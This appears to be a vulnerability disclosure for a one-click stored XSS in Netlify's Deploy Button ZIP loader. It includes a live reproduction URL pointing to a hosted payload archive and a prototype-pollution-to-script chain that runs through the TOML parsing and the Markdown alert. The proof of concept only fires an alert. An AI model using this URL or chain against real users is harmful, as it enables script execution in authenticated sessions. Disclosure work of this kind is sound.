# One-click stored-content XSS in Netlify Deploy Button ZIP loader

## Summary

A signed-in Netlify user can be sent one crafted `app.netlify.com/start/deploy?zip=...` URL. Clicking the page's **Load Template** button once executes attacker-supplied JavaScript in the `https://app.netlify.com` origin.

No project deployment, second button, route change, DevTools navigation, or local file selection is required.

## Reproduction URL

```text
https://app.netlify.com/start/deploy?zip=https%3A%2F%2Fraw.githubusercontent.com%2Flmzkjmiajzj-lgtm%2Fnetlify-deploy-button-one-click-xss-20261016%2Fmain%2Fpayload.zip
```

1. Sign in to Netlify.
2. Open the URL above.
3. Click **Load Template** once.
4. Observe the alert:

```text
Netlify app one-click XSS: app.netlify.com
```

## Source-to-sink chain

```text
Attacker-controlled ZIP URL
  -> Load Template click
  -> ZIP fetched and expanded in the dashboard
  -> vulnerable TOML parser processes netlify.toml
  -> Object.prototype.async = true
  -> Object.prototype.components.img = "script"
  -> Deploy Button's simple TOML parser processes [__proto__]
  -> inherited Markdown carrier becomes a primitive section value
  -> strict-mode property assignment throws a controlled TypeError
  -> page catches the Error and sends Error.message to its Markdown alert
  -> Markdown image gets remapped from img to script
  -> data: JavaScript executes in app.netlify.com
```

The second parser's controlled exception is:

```text
Cannot create property 'trigger' on string '![x](data:;base64,...)'
```

The Markdown image remains embedded in the exception message and is parsed by the dashboard alert component.

## Verified runtime evidence

The browser emitted this production CDP event after exactly one UI click:

```json
{
  "type": "alert",
  "message": "Netlify app one-click XSS: app.netlify.com",
  "url": "https://app.netlify.com/start/deploy?zip=https%3A%2F%2Fraw.githubusercontent.com%2Flmzkjmiajzj-lgtm%2Fnetlify-deploy-button-one-click-xss-20261016%2Fmain%2Fpayload.zip"
}
```

Post-execution state:

```json
{
  "async": true,
  "component": "script",
  "canary": "executed-20261016",
  "dataScriptCount": 1
}
```

## Artifact integrity

Public owned fixture:

```text
https://github.com/lmzkjmiajzj-lgtm/netlify-deploy-button-one-click-xss-20261016
```

`payload.zip` SHA-256:

```text
73fe0a9ac10f6bf177b69d22165e20c872bb8772affd79ccd38e68b10f0e86ab
```

The PoC is intentionally limited to a DOM canary and visible alert. It does not deploy a project, read credentials, or modify account data.
